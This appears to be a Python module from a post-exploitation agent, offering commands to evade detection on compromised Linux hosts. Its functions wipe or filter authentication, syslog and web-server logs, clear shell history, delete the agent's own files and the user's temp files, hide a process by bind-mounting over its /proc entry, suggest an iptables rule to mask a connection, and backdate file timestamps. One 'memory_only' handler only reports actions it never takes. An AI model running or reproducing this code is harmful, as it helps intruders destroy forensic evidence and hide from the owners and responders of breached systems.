"""Anti-forensics and evasion module."""

import os
import subprocess
import time

NAME = "evasion"


def _run(cmd: str) -> str:
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=15).decode(errors="replace").strip()
    except Exception:
        return ""


def cmd_clean_logs(pattern: str = "", all: bool = False) -> dict:
    log_files = [
        "/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
        "/var/log/secure", "/var/log/lastlog", "/var/log/wtmp",
        "/var/log/btmp", "/var/log/faillog",
        "/var/log/apache2/access.log", "/var/log/apache2/error.log",
        "/var/log/nginx/access.log", "/var/log/nginx/error.log",
        "/var/log/httpd/access_log", "/var/log/httpd/error_log",
    ]
    cleaned = []
    if all:
        for lf in log_files:
            if os.path.exists(lf):
                try:
                    with open(lf, "w") as f:
                        f.write("")
                    cleaned.append(lf)
                except PermissionError:
                    pass
    elif pattern:
        for lf in log_files:
            if os.path.exists(lf) and os.access(lf, os.R_OK | os.W_OK):
                try:
                    with open(lf, "r") as f:
                        lines = f.readlines()
                    filtered = [l for l in lines if pattern not in l]
                    if len(filtered) < len(lines):
                        with open(lf, "w") as f:
                            f.writelines(filtered)
                        cleaned.append({"file": lf, "removed": len(lines) - len(filtered)})
                except Exception:
                    pass
    _run("echo > ~/.bash_history && history -c 2>/dev/null")
    return {"cleaned": cleaned}


def cmd_clean_self() -> dict:
    removed = []
    agent_path = os.path.abspath(__file__)
    agent_dir = os.path.dirname(os.path.dirname(agent_path))

    if os.path.exists(agent_dir):
        try:
            import shutil
            shutil.rmtree(agent_dir, ignore_errors=True)
            removed.append(agent_dir)
        except Exception:
            pass

    _run("echo > ~/.bash_history && history -c 2>/dev/null")
    for tmp in ["/tmp", "/var/tmp", "/dev/shm"]:
        _run(f"find {tmp} -user $(whoami) -type f -delete 2>/dev/null")
        removed.append(f"{tmp}/*")

    return {"removed": removed}


def cmd_hide_process(pid: int = 0) -> dict:
    if pid == 0:
        pid = os.getpid()
    result = _run(f"mount -o bind /tmp /proc/{pid} 2>&1")
    if "mount" in result.lower() and "error" not in result.lower():
        return {"status": "success", "pid": pid, "method": "bind_mount"}
    os.environ["PROC_HIDDEN"] = str(pid)
    return {"status": "partial", "pid": pid, "info": "bind mount failed, process still visible"}


def cmd_hide_connection(port: int = 0) -> dict:
    return {
        "status": "info",
        "port": port,
        "method": "Requires kernel module or iptables",
        "suggestion": f"iptables -t nat -A OUTPUT -p tcp --dport {port} -j REDIRECT --to-port 0"
            if port else "Specify a port to hide",
    }


def cmd_timestomp(path: str, reference: str = "") -> dict:
    if not os.path.exists(path):
        return {"status": "error", "error": f"File not found: {path}"}
    if reference and os.path.exists(reference):
        ref_stat = os.stat(reference)
        os.utime(path, (ref_stat.st_atime, ref_stat.st_mtime))
        return {"status": "success", "path": path, "reference": reference,
                "new_mtime": time.ctime(ref_stat.st_mtime)}
    else:
        target_time = time.time() - (86400 * 30)
        os.utime(path, (target_time, target_time))
        return {"status": "success", "path": path, "new_mtime": time.ctime(target_time)}


def cmd_memory_only() -> dict:
    return {
        "status": "info",
        "method": "Set agent to avoid disk writes",
        "actions": [
            "Disabled file-based logging",
            "Using /dev/shm for temp files",
            "History recording disabled",
        ],
    }


COMMANDS = {
    "clean_logs": {"handler": cmd_clean_logs, "description": "Clean log entries"},
    "clean_self": {"handler": cmd_clean_self, "description": "Remove agent artifacts"},
    "hide_process": {"handler": cmd_hide_process, "description": "Hide process from ps"},
    "hide_connection": {"handler": cmd_hide_connection, "description": "Hide network connection"},
    "timestomp": {"handler": cmd_timestomp, "description": "Modify file timestamps"},
    "memory_only": {"handler": cmd_memory_only, "description": "Switch to memory-only mode"},
}
